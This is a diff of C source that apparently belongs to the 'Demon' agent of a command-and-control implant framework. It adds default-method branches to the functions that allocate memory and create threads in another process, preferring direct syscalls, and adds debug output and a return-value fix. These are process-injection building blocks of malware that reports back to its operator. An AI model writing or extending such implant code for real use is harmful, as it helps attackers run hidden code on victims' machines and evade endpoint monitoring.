@@ -8,7 +8,6 @@
 typedef ULONG NTSTATUS;
 #endif
 
-// TODO: handle DX_MEMORY_DEFAULT -> use specified my operator from the gui
 LPVOID MemoryAlloc( DX_MEMORY MemMethode, HANDLE hProcess, SIZE_T MemSize, DWORD Protect )
 {
     PPACKAGE Package  = PackageCreate( DEMON_INFO );
@@ -18,9 +17,24 @@ LPVOID MemoryAlloc( DX_MEMORY MemMethode, HANDLE hProcess, SIZE_T MemSize, DWORD
     PackageAddInt32( Package, DEMON_INFO_MEM_ALLOC );
     switch ( MemMethode )
     {
+        case DX_MEM_DEFAULT:
+        {
+            PUTS( "DX_MEM_DEFAULT" )
+
+            Memory = Instance->Config.Memory.Alloc != DX_MEM_DEFAULT ?
+                    MemoryAlloc( Instance->Config.Memory.Alloc, hProcess, MemSize, Protect ) :  // if the config memory alloc ain't default then use that
+                    MemoryAlloc( DX_MEM_SYSCALL, hProcess, MemSize, Protect );  // if it is default then simply choose Native/Syscall
+
+            return Memory;
+        }
+
         case DX_MEM_WIN32:
         {
+            PRINTF( "VirtualAllocEx( %x, NULL, %ld, %ld, %ld ) => ", hProcess, MemSize, MEM_RESERVE | MEM_COMMIT, Protect );
             Memory = Instance->Win32.VirtualAllocEx( hProcess, NULL, MemSize, MEM_RESERVE | MEM_COMMIT, Protect );
+#ifdef DEBUG
+            printf( "%p\n", Memory );
+#endif
             break;
         }
 
@@ -28,7 +42,9 @@ LPVOID MemoryAlloc( DX_MEMORY MemMethode, HANDLE hProcess, SIZE_T MemSize, DWORD
         {
             PRINTF( "NtAllocateVirtualMemory( %x, %p, %d, %p [%d], %d, %x ) => ", hProcess, &Memory, 0, &MemSize, MemSize, MEM_COMMIT | MEM_RESERVE, Protect );
             NtStatus = Instance->Syscall.NtAllocateVirtualMemory( hProcess, &Memory, 0, &MemSize, MEM_COMMIT | MEM_RESERVE, Protect );
-            PRINTF( "%x\n", NtStatus )
+#ifdef DEBUG
+            printf( "%x\n", NtStatus );
+#endif
             if ( ! NT_SUCCESS( NtStatus ) )
             {
                 PRINTF( "[-] NtAllocateVirtualMemory: Failed:[%lx]\n", NtStatus )
@@ -76,6 +92,7 @@ BOOL MemoryProtect( DX_MEMORY MemMethode, HANDLE hProcess, LPVOID Memory, SIZE_T
         case DX_MEM_SYSCALL:
         {
             NtStatus = Instance->Syscall.NtProtectVirtualMemory( hProcess, &Memory, &MemSize, Protect, &OldProtect );
+
             if ( ! NT_SUCCESS( NtStatus ) )
             {
                 NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
@@ -102,7 +119,7 @@ BOOL MemoryProtect( DX_MEMORY MemMethode, HANDLE hProcess, LPVOID Memory, SIZE_T
         PackageTransmit( Package, NULL, NULL );
     }
 
-    return TRUE;
+    return Success;
 }
 
 BOOL ThreadCreate( DX_THREAD CreateThreadMethode, HANDLE hProcess, LPVOID EntryPoint, PINJECTION_CTX ctx )
@@ -117,6 +134,16 @@ BOOL ThreadCreate( DX_THREAD CreateThreadMethode, HANDLE hProcess, LPVOID EntryP
     PackageAddInt32( Package, DEMON_INFO_MEM_EXEC );
     switch ( CreateThreadMethode )
     {
+        case DX_THREAD_DEFAULT:
+        {
+            PUTS( "DX_MEM_DEFAULT" )
+
+            Success = Instance->Config.Memory.Execute != DX_THREAD_DEFAULT ?
+                      ThreadCreate( Instance->Config.Memory.Execute, hProcess, EntryPoint, ctx ) :  // if the config memory execute ain't default then use that
+                      ThreadCreate( DX_THREAD_SYSCALL, hProcess, EntryPoint, ctx );  // if it is default then simply choose Native/Syscall
+
+            return Success;
+        }
         case DX_THREAD_WIN32:
         {
             PUTS( "DX_THREAD_WIN32" );
